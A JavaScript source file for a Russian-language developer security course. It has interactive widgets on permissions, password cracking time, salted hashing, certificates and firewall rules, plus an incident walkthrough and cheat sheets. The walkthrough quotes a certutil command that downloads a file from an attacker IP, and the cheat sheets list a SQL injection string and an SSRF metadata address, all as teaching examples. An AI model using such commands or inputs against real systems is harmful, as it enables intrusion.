// Код, специфичный для курса «Информационная безопасность»: настройки, виджеты, сквозной сценарий, шпаргалки.
const COURSE = {
  id: 'cyber-security',
  title: 'Информационная безопасность для разработчиков',
  tagline: 'Как атакуют приложения, сети и людей и как от этого защищаться: аутентификация, криптография, OWASP, харденинг, мониторинг, реагирование на инциденты и облако. Каждая атака — по схеме «как работает → как заметить → как защититься». Программа основана на роадмапе roadmap.sh/cyber-security.',
  journeyLabel: 'Разбор инцидента',
  brand: '<svg width="26" height="26" viewBox="0 0 26 26" aria-hidden="true"><path d="M13 2l9 3.5v6.5c0 5.6-3.8 10-9 12-5.2-2-9-6.4-9-12V5.5z" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/><path d="M9 13l3 3 5-6" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>'
};
// Модули из программы, которые ещё не написаны, показываются в карте курса как «скоро»
const UPCOMING = PLAN.filter(p => !MODULES.some(m => m.id === p.id));
MODULES.sort((a, b) => a.id - b.id);

const RES_LABEL = { article:'статья', video:'видео', official:'документация', course:'курс', opensource:'код', book:'книга', podcast:'подкаст', roadmap:'роадмап', feed:'лента' };
function readMore(l){
  const links = (l.topics || []).flatMap(t => (RES[t] ? RES[t].links : []));
  if (!links.length) return '';
  const seen = new Set();
  const items = links.filter(x => !seen.has(x[2]) && seen.add(x[2]));
  return `<h3 id="readmore">Читать дальше</h3><p class="small">Материалы из роадмапа roadmap.sh, в основном на английском.</p><ul class="rm">${items.map(x => `<li><span class="tag muted">${esc(RES_LABEL[x[0]] || x[0])}</span> <a href="${esc(x[2])}" target="_blank" rel="noopener">${esc(x[1])}</a></li>`).join('')}</ul>`;
}

const uid = p => p + Math.random().toString(36).slice(2, 7);

// Человекочитаемая длительность для оценок времени перебора
function humanTime(sec){
  if (!isFinite(sec) || sec > 4.4e17) return 'дольше возраста Вселенной';
  const units = [[31557600e9, 'млрд лет'], [31557600e6, 'млн лет'], [31557600e3, 'тыс. лет'], [31557600, 'лет'], [86400, 'дней'], [3600, 'часов'], [60, 'минут'], [1, 'секунд']];
  for (const [s, n] of units) if (sec >= s) return `≈ ${(sec / s).toLocaleString('ru-RU', { maximumFractionDigits: sec / s < 10 ? 1 : 0 })} ${n}`;
  return 'меньше секунды';
}

const WIDGETS = {
  // Классификация инцидентов по триаде CIA
  cia(el){
    el.className = 'widget';
    const cases = [
      ['База клиентов с телефонами и адресами выложена на форум', 'C', 'Данные увидели те, кому не положено, — нарушена конфиденциальность.'],
      ['Шифровальщик зашифровал файловый сервер, работа отдела встала', 'A', 'Данные целы, но ими нельзя пользоваться — нарушена доступность. Если перед шифрованием данные выгрузили, пострадала и конфиденциальность.'],
      ['Атакующий подменил банковские реквизиты в счёте на оплату', 'I', 'Данные изменены без разрешения — нарушена целостность.'],
      ['DDoS-атака положила интернет-магазин в распродажу', 'A', 'Сервис недоступен для легитимных пользователей.'],
      ['Менеджер отправил файл с зарплатами не тому адресату', 'C', 'Утечка не обязательно результат взлома: ошибка сотрудника тоже нарушает конфиденциальность.'],
      ['Через уязвимость в API пользователь поменял цену товара в своём заказе', 'I', 'Данные изменены в обход правил приложения — нарушена целостность.'],
      ['Истёк TLS-сертификат, браузеры не пускают клиентов на сайт', 'A', 'Защита сработала как надо, но сервис стал недоступен — это тоже инцидент доступности.'],
      ['Злоумышленник удалил записи из журнала, чтобы скрыть следы', 'I', 'Журналы больше не отражают реальность — нарушена целостность, а с ней и возможность расследования.']
    ];
    const ans = {};
    const draw = () => {
      const done = Object.keys(ans).length, ok = Object.entries(ans).filter(([i, a]) => a === cases[i][1]).length;
      el.innerHTML = `<p class="small" style="margin-top:0">Какое свойство в первую очередь нарушено в каждом случае? C — конфиденциальность, I — целостность, A — доступность.</p>
      <div class="cia">${cases.map((c, i) => `<div class="cia-row ${ans[i] ? (ans[i] === c[1] ? 'right' : 'wrong') : ''}"><span>${esc(c[0])}</span><span class="cia-btns">${['C', 'I', 'A'].map(k => `<button class="btn ${ans[i] === k ? '' : 'ghost'} small-btn" data-i="${i}" data-k="${k}" ${ans[i] ? 'disabled' : ''}>${k}</button>`).join('')}</span>${ans[i] ? `<p class="small cia-exp">${ans[i] === c[1] ? '✓' : '✗ Правильно: ' + c[1] + '.'} ${esc(c[2])}</p>` : ''}</div>`).join('')}</div>
      <div class="row" style="margin-top:10px"><b>${ok} из ${done}</b><span class="small">${done === cases.length ? (ok >= 7 ? 'Отлично!' : 'Перечитайте раздел о триаде и попробуйте ещё раз.') : `осталось ${cases.length - done}`}</span>${done ? '<button class="btn ghost small-btn" data-reset>Заново</button>' : ''}</div>`;
      el.querySelectorAll('[data-k]').forEach(b => b.onclick = () => { ans[b.dataset.i] = b.dataset.k; draw(); });
      const r = el.querySelector('[data-reset]'); if (r) r.onclick = () => { for (const k in ans) delete ans[k]; draw(); };
    };
    draw();
  },

  // Права доступа Linux: галочки ↔ восьмеричная запись ↔ символьная
  perm(el){
    el.className = 'widget';
    const id = uid('pm');
    const who = [['u', 'Владелец'], ['g', 'Группа'], ['o', 'Остальные']];
    let bits = 0o640, special = 0, type = 'f';
    el.innerHTML = `<div class="row"><label class="small">Объект <select data-type><option value="f">файл</option><option value="d">каталог</option></select></label>
      <label class="small" for="${id}">Восьмеричная запись</label><input type="text" id="${id}" maxlength="4" style="width:90px;font-family:var(--f-mono)"></div>
      <div class="perm-grid"></div><div class="out"></div>`;
    const inp = el.querySelector('#' + id);
    const sym = () => {
      let s = type === 'd' ? 'd' : '-';
      for (let i = 0; i < 3; i++){
        const v = (bits >> (6 - i * 3)) & 7;
        s += v & 4 ? 'r' : '-'; s += v & 2 ? 'w' : '-';
        const sp = i === 0 ? special & 4 : i === 1 ? special & 2 : special & 1;
        const ch = i === 2 ? 't' : 's';
        s += sp ? (v & 1 ? ch : ch.toUpperCase()) : (v & 1 ? 'x' : '-');
      }
      return s;
    };
    const draw = () => {
      el.querySelector('.perm-grid').innerHTML = `<div></div><b>чтение (r=4)</b><b>запись (w=2)</b><b>${type === 'd' ? 'вход (x=1)' : 'запуск (x=1)'}</b>` +
        who.map(([k, n], i) => `<span>${n}</span>` + [4, 2, 1].map(v => `<label><input type="checkbox" data-sh="${6 - i * 3}" data-v="${v}" ${(bits >> (6 - i * 3)) & v ? 'checked' : ''}></label>`).join('')).join('') +
        `<span>Особые биты</span>${[[4, 'setuid'], [2, 'setgid'], [1, 'sticky']].map(([v, n]) => `<label class="small"><input type="checkbox" data-sp="${v}" ${special & v ? 'checked' : ''}> ${n}</label>`).join('')}`;
      const oct = (special ? String(special) : '') + bits.toString(8).padStart(3, '0');
      if (document.activeElement !== inp) inp.value = oct;
      const w = [];
      if (bits & 0o002) w.push(type === 'd' && special & 1 ? 'Каталог доступен на запись всем, но sticky-бит не даёт удалять чужие файлы (как /tmp).' : 'Запись разрешена всем пользователям системы. Почти никогда не нужно: любой сможет подменить содержимое.');
      if ((bits & 0o777) === 0o777 && !(type === 'd' && special & 1)) w.push('777 — «на всякий случай» открытый доступ. Так часто «чинят» ошибки прав и открывают дыру.');
      if (special & 4 && type === 'f') w.push('setuid: программа запускается с правами владельца. Если владелец root, любая уязвимость в ней даёт повышение привилегий.');
      if (type === 'f' && bits & 0o044 && !(bits & 0o111)) w.push('Файл читают группа или остальные. Для приватных ключей, .env и паролей нужно 600 или 400 — SSH откажется работать с ключом, доступным другим.');
      if (!w.length) w.push('Ничего подозрительного.');
      el.querySelector('.out').innerHTML = `<div class="calc"><div><span>Символьная запись (ls -l)</span><b>${sym()}</b></div><div><span>Команда</span><b>chmod ${oct} ${type === 'd' ? 'dir/' : 'file'}</b></div></div>${w.map(x => `<p class="small" style="margin:6px 0">${x === 'Ничего подозрительного.' ? '✓' : '⚠'} ${x}</p>`).join('')}`;
      el.querySelectorAll('[data-sh]').forEach(c => c.onchange = () => { const m = +c.dataset.v << +c.dataset.sh; bits = c.checked ? bits | m : bits & ~m; draw(); });
      el.querySelectorAll('[data-sp]').forEach(c => c.onchange = () => { const m = +c.dataset.sp; special = c.checked ? special | m : special & ~m; draw(); });
    };
    inp.oninput = () => {
      const v = inp.value.trim();
      if (!/^[0-7]{3,4}$/.test(v)) return;
      const n = parseInt(v, 8); bits = n & 0o777; special = (n >> 9) & 7; draw();
    };
    inp.onblur = draw;
    el.querySelector('[data-type]').onchange = e => { type = e.target.value; draw(); };
    draw();
  },

  // Оценка времени перебора пароля
  brute(el){
    el.className = 'widget';
    // Порядок величины для одной видеокарты уровня RTX 4090 по публичным бенчмаркам hashcat
    const algos = [
      ['MD5 (офлайн)', 1.6e11], ['SHA-1 (офлайн)', 5e10], ['SHA-256 без соли и итераций (офлайн)', 2e10],
      ['bcrypt, cost 12 (офлайн)', 1.5e3], ['Argon2id, 64 МБ (офлайн)', 1e2], ['Онлайн-вход, лимит 10 попыток в минуту', 10 / 60]
    ];
    const sets = [['a–z', 26], ['A–Z', 26], ['0–9', 10], ['символы', 33]];
    const lid = uid('len');
    el.innerHTML = `<div class="row"><label for="${lid}" class="small">Длина <b class="lv"></b></label><input type="range" id="${lid}" min="4" max="24" value="10" style="flex:1;min-width:160px"></div>
      <div class="row" style="margin:8px 0">${sets.map(([n], i) => `<label class="small"><input type="checkbox" data-s="${i}" ${i < 2 || i === 2 ? 'checked' : ''}> ${n}</label>`).join('')}</div>
      <div class="bars brute"></div>
      <p class="small">Оценка для полного перебора, в среднем пароль найдут вдвое быстрее. Скорости — порядок величины для одной игровой видеокарты; у атакующего их может быть сотня. Пароль из утёкшей базы или словаря находится за секунды при любой длине.</p>`;
    const calc = () => {
      const len = +el.querySelector('#' + lid).value;
      el.querySelector('.lv').textContent = len;
      const n = sets.reduce((a, [, k], i) => a + (el.querySelector(`[data-s="${i}"]`).checked ? k : 0), 0) || 26;
      const space = Math.pow(n, len);
      const maxLog = Math.log10(space / algos[algos.length - 1][1]);
      el.querySelector('.brute').innerHTML = `<p class="small" style="margin:0 0 6px">Алфавит ${n} символов, вариантов: ${space < 1e15 ? Math.round(space).toLocaleString('ru-RU') : '10^' + Math.floor(Math.log10(space))}</p>` +
        algos.map(([name, rate]) => { const t = space / rate; const w = Math.max(2, Math.min(100, Math.log10(Math.max(t, 1)) / Math.max(maxLog, 1) * 100)); return `<div class="bar"><span class="bl">${esc(name)}</span><span class="bt"><i style="width:${w}%;background:${t < 86400 * 30 ? 'var(--bad)' : t < 31557600 * 100 ? 'var(--warn)' : 'var(--ok)'}"></i></span><span class="bn" style="width:auto;min-width:120px">${humanTime(t)}</span></div>`; }).join('');
    };
    el.addEventListener('input', calc); calc();
  },

  // Хеширование с солью: одинаковые пароли без соли дают одинаковые хеши
  hash(el){
    el.className = 'widget';
    const pid = uid('pw');
    const users = [['anna', 'qwerty123'], ['oleg', 'qwerty123'], ['ivan', 'Tr0ub4dor&3']];
    const salts = users.map(() => '');
    let salted = false;
    const hex = buf => [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2, '0')).join('');
    const newSalt = () => hex(crypto.getRandomValues(new Uint8Array(8)));
    el.innerHTML = `<p class="small" style="margin-top:0">Пароли пользователей можно менять. Сравните хеши без соли и с солью.</p>
      <div class="hash-users">${users.map(([n, p], i) => `<label class="small">${n}<input type="text" data-i="${i}" value="${esc(p)}" autocomplete="off" style="font-family:var(--f-mono)"></label>`).join('')}</div>
      <div class="row" style="margin:10px 0"><label class="small"><input type="checkbox" data-salt id="${pid}"> Добавить уникальную соль каждому</label><button class="btn ghost small-btn" data-resalt>Новые соли</button></div>
      <div class="hash-out"></div>`;
    const calc = async () => {
      if (!(window.crypto && crypto.subtle)){ el.querySelector('.hash-out').innerHTML = '<p class="small">Браузер не дал доступ к Web Crypto: откройте сайт по HTTPS или через localhost.</p>'; return; }
      const vals = [...el.querySelectorAll('[data-i]')].map(i => i.value);
      const rows = await Promise.all(vals.map(async (p, i) => {
        const input = (salted ? salts[i] : '') + p;
        return [users[i][0], salted ? salts[i] : '—', hex(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(input)))];
      }));
      const count = {}; rows.forEach(r => count[r[2]] = (count[r[2]] || 0) + 1);
      el.querySelector('.hash-out').innerHTML = `<div class="tbl"><table><tr><th>Пользователь</th><th>Соль</th><th>SHA-256(соль + пароль)</th></tr>${rows.map(r => `<tr class="${count[r[2]] > 1 ? 'hash-dup' : ''}"><td>${esc(r[0])}</td><td><code>${esc(r[1])}</code></td><td><code style="word-break:break-all">${r[2]}</code></td></tr>`).join('')}</table></div>
        <p class="small">${Object.values(count).some(c => c > 1) ? '⚠ Одинаковые хеши: по утёкшей базе видно, что у пользователей один пароль, и подобрав его один раз, атакующий получает все такие учётки.' : '✓ Все хеши разные: каждый придётся перебирать отдельно, а заранее посчитанные таблицы бесполезны.'} Соль не секретна и хранится рядом с хешем. Помните: SHA-256 для паролей всё равно слишком быстрый — в реальном приложении используйте Argon2id или bcrypt, они добавляют соль сами.</p>`;
    };
    const resalt = () => { users.forEach((_, i) => salts[i] = newSalt()); };
    resalt();
    el.querySelector('[data-salt]').onchange = e => { salted = e.target.checked; calc(); };
    el.querySelector('[data-resalt]').onclick = () => { resalt(); calc(); };
    el.addEventListener('input', calc); calc();
  },

  // Цепочка сертификатов и ошибки, которые покажет браузер
  certchain(el){
    el.className = 'widget';
    const opts = [
      ['expired', 'Срок сертификата сайта истёк'],
      ['name', 'Пользователь открыл shop-pay.example, а сертификат выдан на shop.example'],
      ['noint', 'Сервер не отдаёт промежуточный сертификат'],
      ['self', 'Сертификат самоподписанный'],
      ['untrusted', 'Корневой CA отсутствует в хранилище доверия (внутренний CA)'],
      ['revoked', 'Сертификат отозван после утечки ключа']
    ];
    const st = {};
    const draw = () => {
      const self = st.self;
      const links = self
        ? [['shop.example', 'выдан: shop.example (сам себе)', !st.expired]]
        : [['ISRG Root X1', 'корневой, в хранилище доверия', !st.untrusted], ['R11', 'промежуточный CA', !st.noint], ['shop.example', 'сертификат сайта', !st.expired && !st.revoked]];
      const checks = [
        ['Цепочка строится до корня', !st.noint && !self],
        ['Корень в хранилище доверия', !st.untrusted && !self],
        ['Подписи всех звеньев верны', true],
        ['Сроки действия не истекли', !st.expired],
        ['Имя в адресной строке есть в SAN', !st.name],
        ['Сертификат не отозван', !st.revoked]
      ];
      let err = '';
      if (self || st.untrusted || st.noint) err = 'NET::ERR_CERT_AUTHORITY_INVALID — браузер не может проверить, кто выдал сертификат.';
      else if (st.revoked) err = 'NET::ERR_CERT_REVOKED — сертификат отозван.';
      else if (st.expired) err = 'NET::ERR_CERT_DATE_INVALID — сертификат недействителен по дате.';
      else if (st.name) err = 'NET::ERR_CERT_COMMON_NAME_INVALID — сертификат выдан другому сайту.';
      el.innerHTML = `<div class="chain">${links.map(([n, d, ok], i) => `${i ? '<span class="chain-arrow">↓ подписал</span>' : ''}<div class="chain-cert ${ok ? '' : 'bad'}"><b>${esc(n)}</b><span class="small">${esc(d)}</span></div>`).join('')}</div>
        <div class="cert-opts">${opts.map(([k, l]) => `<label class="small"><input type="checkbox" data-k="${k}" ${st[k] ? 'checked' : ''}> ${esc(l)}</label>`).join('')}</div>
        <div class="cert-checks">${checks.map(([l, ok]) => `<div class="small">${ok ? '✓' : '✗'} ${esc(l)}</div>`).join('')}</div>
        <div class="fb ${err ? 'bad' : 'ok'}"><b>${err ? 'Браузер покажет ошибку' : 'Соединение защищено'}</b>${err ? esc(err) + ' Нажимать «Всё равно перейти» нельзя: точно так же выглядит перехват трафика.' : 'Все проверки пройдены, замок в адресной строке.'}${st.noint && !self && !st.untrusted ? ' Частая ошибка конфигурации: в nginx указан только сертификат сайта вместо fullchain.pem. Часть браузеров докачает промежуточный сертификат сама, а curl и мобильные приложения — нет.' : ''}</div>`;
      el.querySelectorAll('[data-k]').forEach(c => c.onchange = () => { st[c.dataset.k] = c.checked; draw(); });
    };
    draw();
  },

  // Межсетевой экран: правила проверяются сверху вниз до первого совпадения
  firewall(el){
    el.className = 'widget';
    const rules = [
      { a:'allow', src:'10.0.100.0/24', port:22, note:'SSH для администраторов' },
      { a:'allow', src:'any', port:443, note:'HTTPS для всех' },
      { a:'deny', src:'any', port:22, note:'SSH для остальных' },
      { a:'allow', src:'10.0.1.0/24', port:5432, note:'БД для серверов приложений' }
    ];
    const packets = [['203.0.113.9', 22], ['10.0.100.15', 22], ['198.51.100.4', 443], ['10.0.1.20', 5432], ['10.0.7.33', 5432], ['203.0.113.9', 3389]];
    let pk = 0, def = 'deny';
    const ipNum = s => s.split('.').reduce((a, x) => a * 256 + +x, 0);
    const inNet = (ip, net) => {
      if (net === 'any') return true;
      const [n, p] = net.split('/'); const mask = +p === 0 ? 0 : (0xFFFFFFFF << (32 - +p)) >>> 0;
      return ((ipNum(ip) & mask) >>> 0) === ((ipNum(n) & mask) >>> 0);
    };
    const draw = () => {
      const [ip, port] = packets[pk];
      const hit = rules.findIndex(r => r.port === port && inNet(ip, r.src));
      const verdict = hit >= 0 ? rules[hit].a : def;
      el.innerHTML = `<div class="row"><label class="small">Пакет <select data-pk>${packets.map(([i, p], k) => `<option value="${k}" ${k === pk ? 'selected' : ''}>${i} → порт ${p}</option>`).join('')}</select></label>
        <label class="small">Политика по умолчанию <select data-def><option value="deny" ${def === 'deny' ? 'selected' : ''}>deny</option><option value="allow" ${def === 'allow' ? 'selected' : ''}>allow</option></select></label></div>
        <div class="fw">${rules.map((r, i) => `<div class="fw-rule ${i === hit ? 'hit' : ''} ${hit >= 0 && i > hit ? 'skip' : ''}"><span class="port">${i + 1}</span><b class="fw-${r.a}">${r.a}</b><code>${esc(r.src)} → :${r.port}</code><span class="small">${esc(r.note)}</span><span class="fw-btns"><button class="btn ghost small-btn" data-mv="${i}" data-d="-1" ${i === 0 ? 'disabled' : ''}>↑</button><button class="btn ghost small-btn" data-mv="${i}" data-d="1" ${i === rules.length - 1 ? 'disabled' : ''}>↓</button></span></div>`).join('')}
        <div class="fw-rule ${hit < 0 ? 'hit' : 'skip'}"><span class="port">*</span><b class="fw-${def}">${def}</b><code>политика по умолчанию</code></div></div>
        <div class="fb ${verdict === 'allow' ? 'ok' : 'bad'}"><b>${verdict === 'allow' ? 'Пропущен' : 'Заблокирован'}</b>${hit >= 0 ? `Сработало правило ${hit + 1}; правила ниже не проверяются.` : 'Ни одно правило не совпало — применена политика по умолчанию.'}${def === 'allow' ? ' Политика allow пропускает всё, что забыли запретить: например, RDP на 3389.' : ''}</div>
        <p class="small">Поменяйте порядок правил 1 и 3 и проверьте SSH от администратора: общий запрет выше частного разрешения его заблокирует.</p>`;
      el.querySelector('[data-pk]').onchange = e => { pk = +e.target.value; draw(); };
      el.querySelector('[data-def]').onchange = e => { def = e.target.value; draw(); };
      el.querySelectorAll('[data-mv]').forEach(b => b.onclick = () => { const i = +b.dataset.mv, j = i + +b.dataset.d; [rules[i], rules[j]] = [rules[j], rules[i]]; draw(); });
    };
    draw();
  }
};

function viewTools(){
  const w = (title, lesson, id) => {
    const L = findLesson(lesson);
    return `<h2 style="margin-top:26px">${title}</h2><p class="small">${L ? `Подробно — урок ${lesson.replace('-', '.')} «${esc(L.title)}».` : ''}</p><div data-widget="${id}"></div>`;
  };
  return `<div class="crumbs"><a href="#/">главная</a> / инструменты</div><h1>Инструменты</h1>
  <p class="small" style="margin-top:8px">Всё работает только в браузере: ничего не отправляется в сеть.</p>
  ${w('CIA: что нарушено?', '0-1', 'cia')}
  ${w('Права доступа Linux', '1-4', 'perm')}
  ${w('Сколько времени займёт перебор пароля', '3-3', 'brute')}
  ${w('Хеширование и соль', '4-1', 'hash')}
  ${w('Цепочка сертификатов', '4-3', 'certchain')}
  ${w('Межсетевой экран: первое совпадение', '8-2', 'firewall')}`;
}

// ====== СКВОЗНОЙ СЦЕНАРИЙ ======
const JOURNEY = [
 { t:'Разведка', l:'OSINT', d:'Атакующий изучает компанию по открытым источникам: сайт, вакансии (какой стек и почтовые сервисы используются), профили сотрудников в соцсетях, записи DNS. Цель — найти людей с доступом к деньгам и понять, как выглядит внутренняя переписка.', code:'$ dig +short MX example.com\n10 mx.example-mail.net.\n$ whois example.com | grep -i registrar', lesson:'9-4' },
 { t:'Домен-двойник', l:'тайпсквоттинг', d:'Регистрируется домен exarnple.com (rn вместо m), на нём настраивается почта. В письме он почти неотличим от настоящего.', lesson:'5-3' },
 { t:'Фишинговое письмо', l:'социальная инженерия', d:'Бухгалтеру приходит письмо «от финансового директора»: срочно оплатить счёт, акт во вложении. Срочность и авторитет отправителя — классические рычаги давления.', lesson:'5-2' },
 { t:'Запуск вложения', l:'вредоносное ПО', d:'Во вложении документ с макросом. Пользователь нажимает «Включить содержимое», макрос скачивает и запускает загрузчик. На этом этапе атаку остановили бы запрет макросов из интернета групповой политикой и EDR.', lesson:'7-6' },
 { t:'Кража учётных данных', l:'credential access', d:'Вредонос извлекает из памяти процесса LSASS хеши паролей пользователей, которые входили на этот компьютер, — включая администратора техподдержки.', lesson:'3-3' },
 { t:'Повышение привилегий', l:'privilege escalation', d:'С правами обычного пользователя атакующий находит службу с неправильными правами на исполняемый файл и подменяет его — служба запускается от SYSTEM.', lesson:'3-5' },
 { t:'Горизонтальное перемещение', l:'pass-the-hash · RDP', d:'Хешем администратора, без знания самого пароля, атакующий входит на файловый сервер и контроллер домена. Сеть плоская: с компьютера бухгалтера доступен весь сегмент серверов.', code:'EventID 4624  LogonType 3  AuthenticationPackage NTLM\nAccount: helpdesk-admin   Source: 10.0.12.47 (WS-ACCOUNTING-07)', lesson:'3-3' },
 { t:'Living off the land', l:'LOLBAS', d:'Чтобы не привлекать антивирус своими утилитами, атакующий использует встроенные: PowerShell для разведки, certutil для скачивания файлов, планировщик задач для закрепления.', code:'certutil -urlcache -f http://203.0.113.50/a.txt C:\\Users\\Public\\a.txt', lesson:'11-4' },
 { t:'Выгрузка данных', l:'exfiltration', d:'Архив с договорами и базой клиентов загружается в облачное хранилище атакующего. Исходящий HTTPS-трафик на облака никто не ограничивал.', lesson:'13-4' },
 { t:'Обнаружение', l:'SIEM', d:'Корреляционное правило в SIEM срабатывает: вход администратора техподдержки по NTLM с рабочей станции бухгалтерии в нерабочее время плюс большой объём исходящих данных. Дежурный аналитик открывает инцидент.', lesson:'9-2' },
 { t:'Сдерживание', l:'containment', d:'Заражённые хосты изолируются через EDR, учётная запись администратора блокируется, домен-двойник и адрес загрузчика добавляются в блок-листы. Хосты не выключают: в памяти остаются улики.', lesson:'10-1' },
 { t:'Криминалистика', l:'forensics', d:'Снимаются дамп памяти и образ диска, считаются их хеши. По ним восстанавливают хронологию: какие данные ушли, какие учётки скомпрометированы, где закрепился атакующий.', code:'$ sha256sum ws-accounting-07.raw\n9f2c…e41a  ws-accounting-07.raw', lesson:'10-3' },
 { t:'Восстановление и выводы', l:'recovery · lessons learned', d:'Пароли и ключи сменены, хосты переустановлены из чистых образов, данные — из резервных копий. На разборе решают: MFA для администраторов, запрет макросов, сегментация сети, обучение бухгалтерии и правило в SIEM, которое сработало бы на день раньше.', lesson:'10-1' }
];
let journeyStep = 0;
function viewJourney(){
  return `<div class="crumbs"><a href="#/">главная</a> / сквозной сценарий</div><h1>Разбор инцидента</h1>
  <p style="margin:10px 0 20px;max-width:75ch">Один типичный инцидент от разведки до выводов — по шагам. Каждый шаг ведёт в урок, где тема разобрана подробно.</p>
  <div class="journey"><ol class="jlist" id="jlist"></ol><div class="jcard" id="jcard"></div></div>`;
}
function mountJourney(){
  const draw = () => {
    $('#jlist').innerHTML = JOURNEY.map((s, i) => `<li><button class="${i === journeyStep ? 'on' : ''} ${i < journeyStep ? 'past' : ''}" data-i="${i}"><span class="port">${String(i + 1).padStart(2, '0')}</span><span>${esc(s.t)}</span></button></li>`).join('');
    const s = JOURNEY[journeyStep];
    if (journeyStep === JOURNEY.length - 1) Game.flag(COURSE.id + ':journey');
    const L = findLesson(s.lesson);
    const mod = s.lesson.split('-')[0];
    const link = L ? `Подробно: <a href="#/l/${s.lesson}">урок ${s.lesson.replace('-', '.')} «${esc(L.title)}»</a>` : `Подробно — в модуле ${mod} (появится в следующем обновлении).`;
    $('#jcard').innerHTML = `<div class="crumbs">шаг ${journeyStep + 1} из ${JOURNEY.length} · ${esc(s.l)}</div><h2>${esc(s.t)}</h2><p style="margin-top:10px">${esc(s.d)}</p>${s.code ? `<pre><code>${esc(s.code)}</code></pre>` : ''}<p class="small">${link}</p><div class="row" style="margin-top:14px"><button class="btn ghost" data-d="-1" ${journeyStep === 0 ? 'disabled' : ''}>← Назад</button><button class="btn" data-d="1" ${journeyStep === JOURNEY.length - 1 ? 'disabled' : ''}>Следующий шаг →</button></div>`;
    $('#jlist').querySelectorAll('button').forEach(b => b.onclick = () => { journeyStep = +b.dataset.i; draw(); });
    $('#jcard').querySelectorAll('button[data-d]').forEach(b => b.onclick = () => { journeyStep += +b.dataset.d; draw(); });
  };
  draw();
}

// ====== ШПАРГАЛКИ ======
function viewCheats(){
  const t = (head, rows) => `<div class="tbl"><table><tr>${head.map(h => `<th>${h}</th>`).join('')}</tr>${rows.map(r => `<tr>${r.map(c => `<td>${c}</td>`).join('')}</tr>`).join('')}</table></div>`;
  const pre = s => `<pre><code>${esc(s)}</code></pre>`;
  return `<div class="crumbs"><a href="#/">главная</a> / шпаргалки</div><h1>Шпаргалки</h1>
  <h2 style="margin-top:26px">Небезопасный протокол → защищённая замена</h2>${t(['Было', 'Порт', 'Стало', 'Порт'], [['Telnet', '23', 'SSH', '22'], ['FTP', '20/21', 'SFTP (поверх SSH) или FTPS', '22 / 990'], ['HTTP', '80', 'HTTPS', '443'], ['LDAP', '389', 'LDAPS или LDAP + StartTLS', '636 / 389'], ['SMTP без TLS', '25', 'SMTP + STARTTLS, отправка через submission', '587 / 465'], ['POP3 / IMAP', '110 / 143', 'POP3S / IMAPS', '995 / 993'], ['DNS', '53', 'DNS over TLS / HTTPS, DNSSEC для подлинности', '853 / 443'], ['SNMP v1/v2c', '161', 'SNMPv3 с authPriv', '161'], ['RTP', 'динамич.', 'SRTP', 'динамич.'], ['RDP напрямую в интернет', '3389', 'RDP только через VPN или RD Gateway с MFA', '443']])}
  <h2 style="margin-top:26px">OWASP Top 10 (2021)</h2>${t(['#', 'Категория', 'Пример', 'Главная защита'], [['A01', 'Broken Access Control', '/api/orders/1043 отдаёт чужой заказ', 'проверка прав на сервере для каждого объекта'], ['A02', 'Cryptographic Failures', 'пароли в MD5, данные по HTTP', 'TLS везде, Argon2id/bcrypt для паролей'], ['A03', 'Injection', "' OR 1=1 --, XSS", 'параметризованные запросы, экранирование по контексту'], ['A04', 'Insecure Design', 'восстановление пароля по «секретному вопросу»', 'моделирование угроз на этапе проектирования'], ['A05', 'Security Misconfiguration', 'открытая админка, stack trace в ответе', 'харденинг, одинаковые проверенные конфиги'], ['A06', 'Vulnerable and Outdated Components', 'библиотека с известной CVE', 'инвентаризация зависимостей, SCA, обновления'], ['A07', 'Identification and Authentication Failures', 'нет защиты от перебора', 'MFA, лимиты попыток, безопасные сессии'], ['A08', 'Software and Data Integrity Failures', 'небезопасная десериализация, подмена пакета', 'подписи, проверка целостности, защищённый CI/CD'], ['A09', 'Security Logging and Monitoring Failures', 'взлом заметили через полгода', 'журналы событий безопасности и алерты'], ['A10', 'Server-Side Request Forgery', 'сервер скачивает http://169.254.169.254/', 'allowlist адресов, запрет внутренних сетей']])}
  <h2 style="margin-top:26px">Хранение паролей</h2>${t(['Алгоритм', 'Для паролей', 'Комментарий'], [['Argon2id', '✓ первый выбор', 'рекомендация OWASP; задайте память ≥ 19 МиБ и итерации'], ['scrypt', '✓', 'тоже требует много памяти'], ['bcrypt', '✓', 'cost ≥ 10; учитывайте ограничение 72 байта'], ['PBKDF2-HMAC-SHA256', '✓ если нужен FIPS', 'сотни тысяч итераций (OWASP: 600 000)'], ['SHA-256 / SHA-512', '✗', 'слишком быстрые: миллиарды попыток в секунду'], ['MD5, SHA-1', '✗', 'быстрые и криптографически сломаны'], ['Шифрование (AES)', '✗', 'пароль можно расшифровать, если украдут ключ']])}
  <h2 style="margin-top:26px">Права доступа Linux</h2>${t(['Запись', 'Значение', 'Типичное применение'], [['600 -rw-------', 'чтение и запись только владельцу', 'приватные ключи, .env, ~/.ssh/authorized_keys'], ['644 -rw-r--r--', 'всем читать, писать владельцу', 'обычные файлы, конфиги без секретов'], ['700 drwx------', 'каталог только для владельца', '~/.ssh'], ['755 drwxr-xr-x', 'всем читать и входить', 'каталоги, исполняемые файлы'], ['1777 drwxrwxrwt', 'sticky: удалять только свои файлы', '/tmp'], ['4755 -rwsr-xr-x', 'setuid: запуск с правами владельца', 'passwd; ищите лишние: find / -perm -4000']])}
  <h2 style="margin-top:26px">Реагирование на инцидент (NIST SP 800-61)</h2>${t(['Этап', 'Что делаем'], [['Подготовка', 'контакты, ранбуки, журналы, резервные копии, учения'], ['Обнаружение и анализ', 'подтвердить инцидент, оценить масштаб, зафиксировать улики'], ['Сдерживание', 'изолировать хосты и учётки, не уничтожая улики'], ['Устранение', 'удалить закрепление, закрыть уязвимость, сменить секреты'], ['Восстановление', 'вернуть системы из чистых источников, усиленный мониторинг'], ['Разбор (lessons learned)', 'хронология, причины, задачи на улучшение — без поиска виноватых']])}
  <h2 style="margin-top:26px">Cyber Kill Chain (Lockheed Martin)</h2>${t(['Этап', 'Пример'], [['Reconnaissance', 'сбор данных о сотрудниках и инфраструктуре'], ['Weaponization', 'документ с макросом и загрузчиком'], ['Delivery', 'фишинговое письмо'], ['Exploitation', 'пользователь включил макросы'], ['Installation', 'закрепление через планировщик задач'], ['Command & Control', 'связь с сервером атакующего по HTTPS'], ['Actions on Objectives', 'кража данных, шифрование']])}
